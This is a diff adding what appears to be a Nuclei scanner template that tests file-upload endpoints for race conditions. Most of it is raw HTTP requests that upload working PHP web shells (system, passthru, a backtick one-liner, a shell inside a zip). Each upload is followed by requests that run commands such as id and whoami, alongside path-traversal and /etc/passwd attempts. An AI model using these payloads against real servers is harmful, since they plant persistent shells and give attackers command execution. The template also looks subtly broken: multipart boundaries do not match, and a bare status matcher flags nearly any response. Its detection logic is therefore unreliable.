@@ -1,0 +1,221 @@
+id: medium-upload-race-condition-file-processing
+
+info:
+  name: File Upload Race Condition - File Processing Vulnerability
+  author: elite-red-team
+  severity: medium
+  description: |
+    Detects race condition vulnerabilities in file upload processing where multiple concurrent uploads
+    can bypass security checks, overwrite files, or execute malicious content before validation completes.
+    This template uses advanced timing techniques and concurrent request patterns used by red teams.
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/Race_condition
+    - https://portswigger.net/web-security/race-conditions
+    - https://book.hacktricks.xyz/pentesting-web/race-condition
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:L
+    cvss-score: 6.4
+    cwe-id: CWE-362
+    cpe: cpe:2.3:a:*:file_upload:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 15
+    shodan-query: "file upload"
+  tags: file-upload,race-condition,timing,rce,bypass,elite
+
+variables:
+  filename: "{{rand_base(8)}}"
+  shell_ext: "{{rand_text_alpha(3)}}"
+  timing_window: "50"
+
+http:
+  - raw:
+      # First request - Upload malicious file with shell extension
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alpha(16)}}
+        
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.{{shell_ext}}"
+        Content-Type: application/octet-stream
+        
+        <?php system($_GET['cmd']); ?>
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}--
+
+      # Second request - Concurrent upload with same filename (race condition trigger)
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alpha(16)}}
+        
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.txt"
+        Content-Type: text/plain
+        
+        legitimate content
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}--
+
+      # Third request - Try to access uploaded shell before cleanup
+      - |
+        GET {{path}}/uploads/{{filename}}.{{shell_ext}}?cmd=echo+race_condition_success HTTP/1.1
+        Host: {{Hostname}}
+
+      # Fourth request - Alternative path traversal attempt
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alpha(16)}}
+        
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}
+        Content-Disposition: form-data; name="file"; filename="../{{filename}}.php"
+        Content-Type: text/plain
+        
+        <?php echo "race_bypass_".md5("elite"); ?>
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}--
+
+      # Fifth request - Symlink race condition
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alpha(16)}}
+        
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.lnk"
+        Content-Type: application/octet-stream
+        
+        ../../etc/passwd
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}--
+
+    threads: 10
+    race: true
+    race_count: 5
+    
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "race_condition_success"
+          - "race_bypass_"
+          - "root:x:0:0"
+        condition: or
+
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(uploaded|saved|processed).*successfully"
+          - "(?i)file.*exists.*overwrite"
+          - "(?i)race.*condition.*detected"
+
+      - type: status
+        status:
+          - 200
+          - 201
+        condition: and
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - 'race_bypass_([a-f0-9]{32})'
+          - 'uploaded.*?([a-zA-Z0-9_-]+\.(php|jsp|asp|py))'
+
+# Enhanced payloads for different scenarios
+  - raw:
+      # Advanced timing-based race condition
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alpha(16)}}
+        
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.phtml"
+        Content-Type: image/jpeg
+        
+        ÿØÿà<?php passthru($_GET['x']); ?>
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}--
+
+      # Concurrent legitimate upload
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alpha(16)}}
+        
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jpg"
+        Content-Type: image/jpeg
+        
+        ÿØÿàJFIFlegitimate image data
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}--
+
+      # Quick access attempt
+      - |
+        GET {{path}}/{{filename}}.phtml?x=id HTTP/1.1
+        Host: {{Hostname}}
+
+    threads: 15
+    race: true
+    race_count: 3
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=\\\\d+.*gid=\\\\d+"
+          - "(?i)(www-data|apache|nginx)"
+
+# Double extension race condition
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alpha(16)}}
+        
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jpg.php"
+        Content-Type: image/jpeg
+        
+        <?=`$_GET[0]`?>
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}--
+
+      - |
+        GET {{path}}/uploads/{{filename}}.jpg.php?0=whoami HTTP/1.1
+        Host: {{Hostname}}
+
+    race: true
+    threads: 8
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(root|www-data|apache|nginx|iis|system)"
+
+# Archive extraction race condition
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alpha(16)}}
+        
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.zip"
+        Content-Type: application/zip
+        
+        PK{{hex_decode("030414000000080000000000")}}shell.php{{hex_decode("0000001400000000")}}<?php system($_GET['c']); ?>PK{{hex_decode("010214000000080000000000")}}shell.php{{hex_decode("000000140000000000000000000000000000")}}PK{{hex_decode("050600000000010001003e0000003200000000")}}
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}--
+
+      - |
+        GET {{path}}/uploads/shell.php?c=echo+zip_race_success HTTP/1.1
+        Host: {{Hostname}}
+
+    race: true
+    threads: 5
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "zip_race_success"
